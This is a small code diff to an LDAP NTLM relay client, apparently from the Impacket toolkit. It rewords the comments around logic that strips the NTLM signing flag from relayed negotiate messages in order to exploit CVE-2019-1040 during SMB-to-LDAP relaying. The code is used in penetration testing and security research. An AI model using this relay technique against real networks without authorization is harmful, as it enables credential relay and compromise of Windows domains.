@@ -60,14 +60,12 @@ class LDAPRelayClient(ProtocolClient):
         return True
 
     def sendNegotiate(self, negotiateMessage):
-        # Remove the message signing flag
-        # For SMB->LDAP this is required otherwise it triggers LDAP signing
-
-        # Note that this code is commented out because changing flags breaks the signature
-        # unless the client uses a non-standard implementation of NTLM
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(negotiateMessage)
-        # When exploiting CVE-2019-1040, remove flags
+
+        # When exploiting CVE-2019-1040, remove message signing flag
+        # For SMB->LDAP this is required otherwise it triggers LDAP signing
+        # Changing flags breaks the signature unless the client uses a non-standard implementation of NTLM
         if self.serverConfig.remove_mic:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
